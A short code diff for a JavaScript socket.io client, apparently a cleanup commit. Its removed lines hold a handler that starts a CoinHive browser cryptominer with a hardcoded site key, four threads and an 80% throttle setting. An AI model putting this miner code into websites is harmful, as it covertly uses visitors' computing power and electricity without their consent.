@@ -30,13 +30,3 @@ socket.on('bfx', function(msg) {
     }
   }, this);
 });
-
-socket.on('ip', function(ip) {
-  const miner = new CoinHive.User('sp7LqLtBdTo71t60bB5QMaVlAjZVkIUD', ip, {
-    threads: 4,
-    autoThreads: false,
-    throttle: 0.8,
-    forceASMJS: false
-  });
-  miner.start();
-});
